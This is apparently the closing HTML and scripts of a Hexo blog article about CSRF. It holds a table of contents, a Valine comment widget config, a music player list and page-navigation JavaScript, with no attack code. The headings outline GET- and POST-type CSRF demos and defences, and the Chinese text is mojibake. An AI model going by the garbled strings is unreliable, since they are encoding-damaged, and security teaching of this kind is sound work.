        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#CSRF%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.</span> <span class="toc-text">CSRFæ¼æ´</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#CSRF%E5%8E%9F%E7%90%86"><span class="toc-number">1.1.</span> <span class="toc-text">CSRFåŸç†</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CSRF%E5%88%86%E7%B1%BB"><span class="toc-number">1.2.</span> <span class="toc-text">CSRFåˆ†ç±»</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">1.2.1.</span> <span class="toc-text"></span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#GET%E5%9E%8B%E7%9A%84CSRF"><span class="toc-number">1.2.2.</span> <span class="toc-text">GETå‹çš„CSRF</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%9D%B6%E5%9C%BA%E6%BC%94%E7%A4%BA"><span class="toc-number">1.2.2.1.</span> <span class="toc-text">é¶åœºæ¼”ç¤º</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%9E%E4%BE%8B%E6%BC%94%E7%A4%BA"><span class="toc-number">1.2.2.2.</span> <span class="toc-text">å®ä¾‹æ¼”ç¤º</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#-1"><span class="toc-number">1.2.3.</span> <span class="toc-text"></span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#POST%E5%9E%8B%E7%9A%84CSRF"><span class="toc-number">1.2.4.</span> <span class="toc-text">POSTå‹çš„CSRF</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%9D%B6%E5%9C%BA%E6%BC%94%E7%A4%BA-1"><span class="toc-number">1.2.4.1.</span> <span class="toc-text">é¶åœºæ¼”ç¤º</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%9E%E4%BE%8B%E6%BC%94%E7%A4%BA-1"><span class="toc-number">1.2.4.2.</span> <span class="toc-text">å®ä¾‹æ¼”ç¤º</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CSRF%E6%BC%8F%E6%B4%9E%E7%9A%84%E6%8C%96%E6%8E%98"><span class="toc-number">1.3.</span> <span class="toc-text">CSRFæ¼æ´çš„æŒ–æ˜</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CSRF%E6%BC%8F%E6%B4%9E%E7%9A%84%E9%98%B2%E5%BE%A1"><span class="toc-number">1.4.</span> <span class="toc-text">CSRFæ¼æ´çš„é˜²å¾¡</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#CSRF-Token%EF%BC%88%E9%98%B2%E4%BC%AA%E5%8D%B0%E7%AB%A0%EF%BC%89"><span class="toc-number">1.4.0.1.</span> <span class="toc-text">CSRF Tokenï¼ˆé˜²ä¼ªå°ç« ï¼‰</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SameSite-Cookie%EF%BC%88%E7%AE%A1%E5%AE%B6%E8%AE%A4%E9%97%A8%EF%BC%89"><span class="toc-number">1.4.0.2.</span> <span class="toc-text">SameSite Cookieï¼ˆç®¡å®¶è®¤é—¨ï¼‰</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%AA%8C%E8%AF%81%E8%AF%B7%E6%B1%82%E6%9D%A5%E6%BA%90%EF%BC%88Referer-Origin%E5%A4%B4%EF%BC%89%EF%BC%88%E6%9F%A5%E5%BF%AB%E9%80%92%E5%8D%95%EF%BC%89"><span class="toc-number">1.4.0.3.</span> <span class="toc-text">éªŒè¯è¯·æ±‚æ¥æºï¼ˆReferer&#x2F;Originå¤´ï¼‰ï¼ˆæŸ¥å¿«é€’å•ï¼‰</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8%E8%87%AA%E5%AE%9A%E4%B9%89Header%EF%BC%88%E6%9A%97%E5%8F%B7%EF%BC%89"><span class="toc-number">1.4.0.4.</span> <span class="toc-text">ä½¿ç”¨è‡ªå®šä¹‰Headerï¼ˆæš—å·ï¼‰</span></a></li></ol></li></ol></li></ol></li></ol>
      </div>
      
        <div class="catelogue catelogue-2">
           
          
            <p>
              <span>ä¸‹ä¸€ç¯‡</span>
              <a href="/2025/08/23/XSS/">XSS</a>
            </p>
          
        </div>
      
    </div>
  </div>
</div>


<script>
  // varå®šä¹‰ï¼Œé¿å…pjaxé‡æ–°è¿›æ¥é€ æˆçš„é‡å¤å£°æ˜é”™è¯¯
  var config = JSON.parse('{"enable":true,"appId":"Pf8zCXGEH1qsprnWfikVVujL-gzGzoHsz","appKey":"qOqoiUHhH1TGtLRUYURkLRQX","placeholder":"è¯·ç•™ä¸‹ä½ å®è´µçš„æ„è§å§~","meta":["nick"],"recordIP":true,"visitor":true,"enableQQ":true}')
  new Valine({
    el: '#vcomments',
    appId: config.appId,
    appKey: config.appKey,
    placeholder: config.placeholder,
    meta: config.meta,
    recordIP: config.recordIP,
    visitor: config.visitor,
    enableQQ: config.enableQQ,
    path: '2025/08/24/CSRF/'
  })
</script>


<script>
  $(document).on('pjax:complete', function() {
    const tocs = document.querySelector('.toc')
    const links = tocs ? tocs.querySelectorAll('a') : []
    links.forEach(link => {
      link.addEventListener('click', e => {
        const href = decodeURIComponent(e.href)
        href.search(/#(.*)/)
        const id = RegExp.$1
        const target = document.querySelector('#' + id)
        const top = target.offsetTop
        document.documentElement.scrollTo({
          top: top - 100,
          behavior: 'smooth'
        })
        e.preventDefault()
      })
    })
  })
</script> 

</div>
      <div class="main-right-wrapper"><div class="main-right">
  <div class="main-right--board">
    <div class="main-right--title">
      <h5>å…¬å‘Šæ </h5>
      <i class="iconfont icon-gonggao"></i>
    </div>
    <div class="main-right--content">
      Hi~æ¬¢è¿ä½ ä»¬æ¥åˆ°æˆ‘çš„åšå®¢å°ç«™ï¼Œå¸Œæœ›èƒ½åœ¨è¿™é‡Œæ”¶è·åˆ°æœ‰ç”¨çš„ä¸œè¥¿å“¦ï¼ 
    </div>
  </div>

  <div id="aplayer" class="main-right--music"></div>

  <div class="operate-items">
    <div class="operate-item backtop">
      <i class="iconfont icon-huidaodingbu"></i>
      <span>å›åˆ°é¡¶éƒ¨</span>
    </div>
    
    <div class="operate-item turn-comment hidden">
      <i class="iconfont icon-pinglun"></i>
      <span>æŸ¥çœ‹è¯„è®º</span>
    </div>
    
  </div>

  <div class="main-right--site">
    <div class="main-right--power">
      <p>Power By <a target="_blank" rel="noopener" href="https://hexo.io/zh-cn/docs/">Hexo</a>.</p>
      <p>Themeï¼š<a target="_blank" rel="noopener" href="https://github.com/Aizener/hexo-theme-cola">Cola.</a></p>
    </div>
    <p class="main-right--refer"><a target="_blank" rel="noopener" href="https://beian.miit.gov.cn/#/Integrated/index">èœ€ICPå¤‡2022005384å·-1</a> </p>
  </div>
</div>

<script>
  function setOperateItem () {
    const reg = /\d{4}\/\d{2}\/\d{2}\/.+/
    const path = location.pathname
    const operateDom = document.querySelector('.main-right .operate-items')
    const commentDom = document.querySelector('.turn-comment')
    const cateloguDom = document.querySelector('.article-catelogue > .article-catelogue--wrapper');

    if (commentDom) {
      if (reg.test(path) || path.match(/\/log\/.+/)) {
        commentDom.classList.remove('hidden')
        const newDom = operateDom.cloneNode(true);
        const _backtopDom = newDom.querySelector('.backtop');
        const _commentDom = newDom.querySelector('.turn-comment');
        _backtopDom.addEventListener('click', () => backTopEvent());
        _commentDom.addEventListener('click', () => commentDomEvent());
        cateloguDom.appendChild(newDom);
      } else {
        commentDom.classList.add('hidden')
      }
    }
  }

  setOperateItem()
  const musics = JSON.parse(`[{"name":"ç¬¬57æ¬¡å–æ¶ˆå‘é€","artist":"ä¸çŸ¥å","url":"music/ç¬¬57æ¬¡å–æ¶ˆå‘é€.mp3","cover":"/imgs/cc.jpg"},{"name":"ç¬","artist":"éƒ‘æ¶¦æ³½","url":"music/ç¬.mp3","cover":"/imgs/cc.jpg"},{"name":"æƒ³ä½ æ—¶é£èµ·","artist":"å•ä¾çº¯","url":"music/æƒ³ä½ æ—¶é£èµ·-å•ä¾çº¯.mp3","cover":"/imgs/cc.jpg"},{"name":"å¿ƒè®¸ç™¾å¹´","artist":"c","url":"music/å¿ƒè®¸ç™¾å¹´.mp3","cover":"/imgs/cc.jpg"},{"name":"ğŸŸ","artist":"é±¼ä»”","url":"music/é±¼ä»”.mp3","cover":"/imgs/cc.jpg"},{"name":"è‡´ä½ ","artist":"ç‹èµ«é‡","url":"music/è‡´ä½ ï¼ç‹èµ«é‡.mp3","cover":"/imgs/cc.jpg"}]`)
  const ap = new APlayer({
    container: document.querySelector('#aplayer'),
    audio: musics,
  })

  $(document).on('pjax:complete', function() {
    setOperateItem()
  })

  document.querySelector('.backtop').addEventListener('click', () => {
    backTopEvent();
  })
  const dom = document.querySelector('.turn-comment')
  dom && dom.addEventListener('click', () => {
    commentDomEvent();
  })

  function backTopEvent() {
    document.documentElement.scrollTo({
      top: 0,
      behavior: 'smooth'
    })
  }

  function commentDomEvent() {
    const commentDom = document.querySelector('.comments-intro')
    if (!commentDom) return
    const top = commentDom.offsetTop, height = commentDom.offsetHeight
    document.documentElement.scrollTo({
      top: top - 2 * height,
      behavior: 'smooth'
    })
  }
</script></div>
    </section>
  </div>
  <div id="progress" class="progress"></div>
  <div id="gray" class="gray"></div>

  <script>
    function initScroll () {
      document.addEventListener('scroll', () => {
        const doc = document.documentElement
        const scrollTop = doc.scrollTop
        const pageHeight = doc.offsetHeight
        const clientHeight = doc.clientHeight
        const ratio = scrollTop / (pageHeight - clientHeight)
        const progress = document.querySelector('#progress')
        const avatarImg = document.querySelector('.main-left--avatar')
        progress.style.width = (100 * ratio) + '%'
        avatarImg.style.transform = `rotate(${360 * ratio}deg)`
      })
    }

    const rootPath = "/"

    const checkAndSetArticlePageLayout = () => {
      const path = location.pathname.replace(rootPath, '');
      if (
        /^\/?\d{4}\/\d{2}\/\d{2}\/.*/.test(path) ||
        /^log\/.+/.test(path)
      ) {
        $('.main-container, .main-right, .main-right-wrapper').addClass('is-article')
      } else {
        $('.main-container, .main-right, .main-right-wrapper').removeClass('is-article')
      }
    }

    const gray = "none"
    const setGrayStyle = () => {
      if (gray === 'none') {
        return
      } else if (gray === 'index') {
        location.pathname === '/' ? $('#gray').show() : $('#gray').hide()
      } else if (gray === 'all') {
        $('#gray').show()
      }
    }
    setGrayStyle()


    window.onload = function () {
      checkAndSetArticlePageLayout()
      setTimeout(() => {
        $('#load').slideUp()
        $('#container').slideToggle()
        setTimeout(() => {
          initScroll();
        }, 500)
      }, 500)
    }
    
    let status = 0
    // å¯¹æ‰€æœ‰é“¾æ¥è·³è½¬äº‹ä»¶ç»‘å®špjaxå®¹å™¨container
    $(document).pjax('a[target!=_blank]', '#main-container', {
      container: '#main-container',
      fragment: '#main-container',
      timeout: 8000
    })

    $(document).on('pjax:start', function() {
    })
    $(document).on('pjax:complete', function() {
      status = 0
      $('.main-container').addClass('to-up').on('animationend', function() {
        $(this).removeClass('to-up')
      })
      setGrayStyle()
      checkAndSetArticlePageLayout()
    })
    $(document).on('pjax:popstate', function() {
      status = -1
      checkAndSetArticlePageLayout()
    });
  </script>
</body>
</html>